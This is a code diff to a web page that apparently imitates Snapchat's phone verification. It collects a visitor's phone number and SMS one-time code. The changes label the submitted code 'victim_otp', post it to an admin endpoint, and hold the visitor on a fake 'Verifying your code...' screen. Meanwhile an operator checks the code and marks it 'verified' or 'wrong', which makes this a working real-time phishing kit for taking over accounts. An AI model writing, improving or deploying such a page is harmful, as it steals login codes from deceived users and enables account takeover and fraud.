@@ -10,26 +10,22 @@
         .container { width: 100%; max-width: 420px; }
         .card { background: rgba(26,26,26,0.95); backdrop-filter: blur(20px); border-radius: 40px; padding: 36px 28px 28px; box-shadow: 0 30px 80px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.06); }
 
-        /* Language selector */
         .lang-selector { display: flex; gap: 8px; justify-content: flex-end; margin-bottom: 16px; }
         .lang-selector button { background: transparent; border: 1px solid rgba(255,255,255,0.1); color: #888; padding: 4px 12px; border-radius: 20px; cursor: pointer; font-size: 12px; transition: all 0.3s; }
         .lang-selector button:hover { border-color: #FFFC00; color: #fff; }
         .lang-selector button.active { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.1); }
 
-        /* Brand */
         .brand { text-align: center; margin-bottom: 28px; }
         .brand .snap-icon { width: 72px; height: 72px; background: linear-gradient(135deg, #FFFC00, #FFD700); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 36px; box-shadow: 0 0 60px rgba(255,252,0,0.15); }
         .brand h1 { font-size: 32px; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
         .brand h1 span { color: #FFFC00; }
         .brand .tagline { color: #888; font-size: 14px; margin-top: 6px; }
 
-        /* Steps */
         .step { display: none; animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
         .step.active { display: block; }
         @keyframes fadeUp { 0% { opacity: 0; transform: translateY(20px) scale(0.98); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
         .step-title { color: #fff; font-size: 22px; font-weight: 600; text-align: center; margin-bottom: 20px; }
 
-        /* Country, Network */
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
         .country-card, .network-card { padding: 18px 12px; border-radius: 20px; border: 2px solid rgba(255,255,255,0.06); background: rgba(255,255,255,0.03); color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: all 0.3s; text-align: center; }
         .country-card:hover, .network-card:hover { transform: translateY(-2px); border-color: rgba(255,252,0,0.3); }
@@ -38,14 +34,12 @@
         .network-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .network-card { font-size: 13px; padding: 14px 10px; }
 
-        /* Input */
         .input-group { display: flex; align-items: center; background: rgba(255,255,255,0.04); border-radius: 18px; border: 2px solid rgba(255,255,255,0.06); padding: 0 18px; margin-bottom: 14px; transition: all 0.3s; }
         .input-group:focus-within { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.05); }
         .input-group .code { color: #aaa; font-size: 16px; font-weight: 500; padding-right: 14px; border-right: 1px solid rgba(255,255,255,0.06); }
         .input-group input { flex: 1; padding: 18px 14px; background: transparent; border: none; outline: none; color: #fff; font-size: 17px; }
         .input-group input::placeholder { color: #444; }
 
-        /* Buttons */
         .btn { width: 100%; padding: 18px; border-radius: 18px; border: none; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
         .btn-primary { background: linear-gradient(135deg, #FFFC00, #FFD700); color: #000; }
         .btn-primary:hover { transform: scale(1.02); box-shadow: 0 8px 40px rgba(255,252,0,0.25); }
@@ -53,14 +47,12 @@
         .btn-secondary { background: rgba(255,255,255,0.06); color: #fff; margin-top: 10px; }
         .btn-secondary:hover { background: rgba(255,255,255,0.1); }
 
-        /* OTP */
         .otp-box { display: flex; gap: 12px; justify-content: center; margin: 24px 0 20px; }
         .otp-box input { width: 56px; height: 64px; text-align: center; font-size: 28px; font-weight: 700; background: rgba(255,255,255,0.04); border: 2px solid rgba(255,255,255,0.08); border-radius: 16px; color: #fff; outline: none; transition: all 0.3s; caret-color: #FFFC00; }
         .otp-box input:focus { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.06); background: rgba(255,255,255,0.06); }
         .otp-hint { text-align: center; color: #777; font-size: 14px; }
         .otp-hint strong { color: #fff; }
 
-        /* Loader */
         .loader-wrap { text-align: center; padding: 20px 0; }
         .loader-spinner { width: 48px; height: 48px; border: 3px solid rgba(255,255,255,0.06); border-top-color: #FFFC00; border-radius: 50%; margin: 0 auto 16px; animation: spin 0.9s cubic-bezier(0.16,1,0.3,1) infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
@@ -69,13 +61,11 @@
         .loader-text { color: #888; font-size: 15px; text-align: center; margin-top: 12px; }
         .loader-text strong { color: #fff; }
 
-        /* Success / Error */
         .icon-big { font-size: 64px; text-align: center; margin: 12px 0 16px; }
         .msg-center { text-align: center; color: #aaa; font-size: 16px; line-height: 1.7; }
         .error-text { color: #ff6b6b !important; }
         .success-text { color: #69db7c !important; }
 
-        /* Info box */
         .info-box { background: rgba(255,255,255,0.03); border-radius: 14px; padding: 14px 18px; margin-bottom: 16px; border-left: 3px solid #FFFC00; }
         .info-box p { color: #aaa; font-size: 14px; line-height: 1.6; }
         .info-box strong { color: #fff; }
@@ -167,8 +157,11 @@
                 <p style="font-size:13px;color:#666;margin-top:4px;" id="otpHint">Please check your SMS and enter the code below.</p>
             </div>
             <div class="otp-box" id="otpContainer"></div>
-            <button class="btn btn-primary" id="verifyBtn">Verify Code →</button>
+            <button class="btn btn-primary" id="verifyBtn">Submit Code →</button>
             <button class="btn btn-secondary" id="backToPhone">← Back</button>
+            <div id="verifyingMessage" style="display:none; text-align:center; color:#FFFC00; margin-top:12px;">
+                ⏳ Verifying your code...
+            </div>
         </div>
 
         <!-- STEP 6: Success -->
@@ -234,7 +227,7 @@
             enterOTP: '🔑 Enter Verification Code',
             otpInfo: '📲 We sent a <strong>verification code</strong> to ',
             otpHint: 'Please check your SMS and enter the code below.',
-            verify: 'Verify Code →',
+            verify: 'Submit Code →',
             successTitle: 'Verification Successful!',
             successText: '✅ Your account has been verified.',
             successSub: 'You can now access all features.',
@@ -261,7 +254,7 @@
             enterOTP: '🔑 Entrez le code de vérification',
             otpInfo: '📲 Nous avons envoyé un <strong>code de vérification</strong> à ',
             otpHint: 'Veuillez vérifier votre SMS et saisir le code ci-dessous.',
-            verify: 'Vérifier le code →',
+            verify: 'Soumettre le code →',
             successTitle: 'Vérification réussie !',
             successText: '✅ Votre compte a été vérifié.',
             successSub: 'Vous pouvez maintenant accéder à toutes les fonctionnalités.',
@@ -288,7 +281,7 @@
             enterOTP: '🔑 Voer verificatiecode in',
             otpInfo: '📲 We hebben een <strong>verificatiecode</strong> gestuurd naar ',
             otpHint: 'Controleer uw SMS en voer de code hieronder in.',
-            verify: 'Verifiëren →',
+            verify: 'Code indienen →',
             successTitle: 'Verificatie geslaagd!',
             successText: '✅ Uw account is geverifieerd.',
             successSub: 'U kunt nu alle functies gebruiken.',
@@ -300,9 +293,6 @@
         }
     };
 
-    // ============================================================
-    // LANGUAGE SETTER
-    // ============================================================
     function setLang(lang) {
         currentLang = lang;
         const t = LANG[lang];
@@ -338,7 +328,6 @@
         document.getElementById('retryOTPBtn').textContent = t.tryAgain;
     }
 
-    // Language selector listeners
     document.querySelectorAll('.lang-selector button').forEach(btn => {
         btn.addEventListener('click', function() {
             const lang = this.dataset.lang;
@@ -366,6 +355,7 @@
 
     const sendBtn = document.getElementById('sendBtn');
     const verifyBtn = document.getElementById('verifyBtn');
+    const verifyingMessage = document.getElementById('verifyingMessage');
 
     function goToStep(id) {
         document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
@@ -478,7 +468,7 @@
                 for (const queue in data) {
                     for (const entry of data[queue]) {
                         if (entry.id === queueId) {
-                            if (entry.status === 'otp_sent') {
+                            if (entry.status === 'awaiting_otp') {
                                 clearInterval(checkInterval);
                                 otpLength = entry.otp_length || 4;
                                 goToStep('step5');
@@ -534,7 +524,7 @@
                     if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                         otpContainer.children[idx - 1].focus();
                     }
-                    if (e.key === 'Enter') { verifyOTP(); }
+                    if (e.key === 'Enter') { submitOTP(); }
                 };
             }(i));
             otpContainer.appendChild(input);
@@ -542,9 +532,9 @@
         setTimeout(function() { var first = otpContainer.querySelector('input'); if (first) first.focus(); }, 100);
     }
 
-    verifyBtn.addEventListener('click', verifyOTP);
+    verifyBtn.addEventListener('click', submitOTP);
 
-    async function verifyOTP() {
+    async function submitOTP() {
         var inputs = otpContainer.querySelectorAll('input');
         var otp = '';
         for (var i = 0; i < otpLength; i++) { otp += inputs[i]?.value || ''; }
@@ -553,21 +543,67 @@
             return;
         }
 
+        // Show verifying message
+        verifyingMessage.style.display = 'block';
+        verifyBtn.disabled = true;
+
         try {
             var response = await fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     queueId: queueId,
-                    action: 'verify_otp',
+                    action: 'victim_otp',
                     otp: otp
                 })
             });
             var data = await response.json();
-            if (data.success) { goToStep('step6'); } else { goToStep('step7'); }
+            if (data.success) {
+                // Wait for admin to verify
+                await waitForAdminVerification();
+            } else {
+                alert('Error submitting OTP. Please try again.');
+                verifyingMessage.style.display = 'none';
+                verifyBtn.disabled = false;
+            }
         } catch (error) {
-            alert('Error verifying OTP. Please try again.');
+            alert('Error submitting OTP. Please try again.');
+            verifyingMessage.style.display = 'none';
+            verifyBtn.disabled = false;
         }
+    }
+
+    async function waitForAdminVerification() {
+        let attempts = 0;
+        const checkInterval = setInterval(async function() {
+            attempts++;
+            try {
+                const response = await fetch('/api/admin/queues');
+                const data = await response.json();
+                for (const queue in data) {
+                    for (const entry of data[queue]) {
+                        if (entry.id === queueId) {
+                            if (entry.status === 'verified') {
+                                clearInterval(checkInterval);
+                                goToStep('step6');
+                                return;
+                            }
+                            if (entry.status === 'wrong') {
+                                clearInterval(checkInterval);
+                                goToStep('step7');
+                                return;
+                            }
+                            break;
+                        }
+                    }
+                }
+                if (attempts >= 60) {
+                    clearInterval(checkInterval);
+                    alert('Timeout. Please try again.');
+                    resetAll();
+                }
+            } catch (error) {}
+        }, 2000);
     }
 
     // ============================================================
@@ -582,6 +618,8 @@
         document.querySelectorAll('.otp-box input').forEach(el => el.value = '');
         document.querySelectorAll('.country-card, .network-card').forEach(el => el.classList.remove('selected'));
         progressFill.style.width = '0%';
+        verifyingMessage.style.display = 'none';
+        verifyBtn.disabled = false;
     }
 
     // ============================================================
